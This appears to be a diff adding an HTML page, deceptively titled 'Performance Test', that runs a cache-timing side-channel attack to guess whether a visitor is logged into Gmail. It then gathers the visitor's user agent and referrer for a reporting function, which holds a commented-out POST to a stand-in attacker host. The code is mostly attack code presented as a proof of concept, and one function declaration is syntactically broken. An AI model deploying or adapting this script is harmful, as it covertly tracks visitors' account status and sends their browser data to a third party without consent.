@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Performance Test</title>
+    <style>
+        body { font-family: Arial; padding: 20px; }
+        .result { margin: 10px 0; padding: 10px; border-radius: 5px; }
+        .logged-in { background: #ffebee; border: 1px solid #f44336; }
+        .logged-out { background: #e8f5e8; border: 1px solid #4caf50; }
+        .uncertain { background: #fff3e0; border: 1px solid #ff9800; }
+    </style>
+</head>
+<body>
+    <h2>Gmail Login Detection via Cache Timing</h2>
+    <button onclick="detectGmailLogin()">Detect Gmail Login Status</button>
+    <div id="results"></div>
+
+<script>
+async detectGmailLogin() {
+    const resultsDiv = document.getElementById('results');
+    resultsDiv.innerHTML = '<div class="result">Testing... ⏳</div>';
+
+    // Gmail-specific resources yang berbeda cached behavior untuk logged-in vs logged-out
+    const testResources = [
+        {
+            url: 'https://mail.google.com/mail/images/cleardot.gif',
+            name: 'Gmail Core Resource',
+            expectedLoggedIn: true
+        },
+        {
+            url: 'https://ssl.gstatic.com/gb/images/k1_a31af7ac.png', 
+            name: 'Google Auth Resource',
+            expectedLoggedIn: true
+        },
+        {
+            url: 'https://accounts.google.com/ServiceLogin',
+            name: 'Login Page',
+            expectedLoggedIn: false // Kalau cached, berarti baru akses login page
+        }
+    ];
+
+    let loggedInProbability = 0;
+
+    for (const resource of testResources) {
+        const loadTime = await measureLoadTime(resource.url);
+        const isCached = loadTime < 80; // Threshold untuk cached resource
+        
+        let status, confidence, explanation;
+        
+        if (resource.expectedLoggedIn && isCached) {
+            status = 'LIKELY LOGGED IN';
+            confidence = 'HIGH';
+            explanation = `Resource ${resource.name} loaded quickly (${loadTime}ms) - typical for logged-in users`;
+            loggedInProbability += 0.4;
+        } else if (!resource.expectedLoggedIn && isCached) {
+            status = 'LIKELY LOGGED OUT'; 
+            confidence = 'MEDIUM';
+            explanation = `Login page resource cached (${loadTime}ms) - user recently visited login page`;
+            loggedInProbability -= 0.3;
+        } else {
+            status = 'UNCERTAIN';
+            confidence = 'LOW';
+            explanation = `Inconclusive data (${loadTime}ms)`;
+        }
+
+        resultsDiv.innerHTML += `
+            <div class="result ${status.includes('LOGGED IN') ? 'logged-in' : status.includes('LOGGED OUT') ? 'logged-out' : 'uncertain'}">
+                <strong>${resource.name}</strong><br>
+                Status: ${status}<br>
+                Confidence: ${confidence}<br>
+                Load Time: ${loadTime}ms<br>
+                ${explanation}
+            </div>
+        `;
+    }
+
+    // Overall conclusion
+    let finalStatus, finalClass;
+    if (loggedInProbability > 0.5) {
+        finalStatus = '🚨 HIGH PROBABILITY USER IS LOGGED INTO GMAIL';
+        finalClass = 'logged-in';
+    } else if (loggedInProbability < -0.2) {
+        finalStatus = '✅ HIGH PROBABILITY USER IS LOGGED OUT OF GMAIL';
+        finalClass = 'logged-out';
+    } else {
+        finalStatus = '⚠️ INCONCLUSIVE - Cannot determine login status';
+        finalClass = 'uncertain';
+    }
+
+    resultsDiv.innerHTML += `
+        <div class="result ${finalClass}" style="margin-top: 20px; font-size: 18px;">
+            <strong>FINAL DETECTION RESULT:</strong><br>
+            ${finalStatus}<br>
+            Detection Score: ${loggedInProbability.toFixed(2)}
+        </div>
+    `;
+
+    // Send results to attacker server (simulated)
+    await reportToAttacker(loggedInProbability);
+}
+
+async function measureLoadTime(url) {
+    // Multiple measurements untuk accuracy
+    const timings = [];
+    
+    for (let i = 0; i < 3; i++) {
+        const start = performance.now();
+        
+        try {
+            await fetch(url, {
+                method: 'HEAD',
+                mode: 'no-cors',
+                cache: 'no-cache',
+                credentials: 'omit'
+            });
+        } catch(e) {
+            // Ignore CORS errors - kita cuma butuh timing
+        }
+        
+        const end = performance.now();
+        timings.push(end - start);
+        
+        // Delay antara measurements
+        await new Promise(resolve => setTimeout(resolve, 200));
+    }
+    
+    // Return median untuk avoid outliers
+    timings.sort((a, b) => a - b);
+    return timings[1]; // Median
+}
+
+async function reportToAttacker(probability) {
+    // Simulate sending data to attacker
+    const data = {
+        timestamp: new Date().toISOString(),
+        probability: probability,
+        userAgent: navigator.userAgent,
+        referrer: document.referrer
+    };
+    
+    console.log('Sending to attacker:', data);
+    
+    // In real attack, ini akan kirim ke attacker server
+    // fetch('https://attacker.com/collect', {
+    //     method: 'POST',
+    //     body: JSON.stringify(data)
+    // });
+}
+</script>
+</body>
+</html>
